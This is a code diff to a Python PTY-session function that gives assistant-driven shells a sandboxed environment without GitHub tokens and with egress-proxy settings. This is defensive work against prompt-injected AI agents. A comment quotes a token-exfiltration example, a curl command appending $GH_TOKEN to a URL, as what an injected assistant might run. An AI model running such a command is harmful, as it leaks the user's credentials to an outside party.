@@ -269,7 +269,18 @@ def _create_pty_session(
         shell = os.environ.get("SHELL", "/bin/zsh")
         shell_cmd = [shell, "-l"]
 
-    env = os.environ.copy()
+    if hidden:
+        # The assistant drives this shell, so it starts from the run_sandboxed
+        # environment: no GitHub tokens (a prompt-injected
+        # `curl "...?t=$GH_TOKEN"` finds nothing), and under a non-permissive
+        # network tier the egress proxy vars, since its profile denies direct
+        # 80/443. A confined one also sends its npm, pip and uv caches to the
+        # chat session's scratch folder. The user's own terminal keeps their env.
+        from server.sandbox import _merged_env, _scratch_env
+
+        env = _merged_env(_scratch_env(write_mode, scratch_dir))
+    else:
+        env = os.environ.copy()
     env["TERM"] = "xterm-256color"
     env["COLORTERM"] = "truecolor"
     if hidden:
@@ -287,13 +298,11 @@ def _create_pty_session(
     # where its npm, pip and uv caches live.
     profile_path = None
     if hidden:
-        from server.sandbox import build_pty_sandbox_wrap, scratch_cache_env
+        from server.sandbox import build_pty_sandbox_wrap
 
         shell_cmd, profile_path = build_pty_sandbox_wrap(
             shell_cmd, write_root, write_mode=write_mode, scratch_dir=scratch_dir
         )
-        if write_mode == "workspace" and scratch_dir:
-            env.update(scratch_cache_env(scratch_dir))
 
     process = subprocess.Popen(
         shell_cmd,
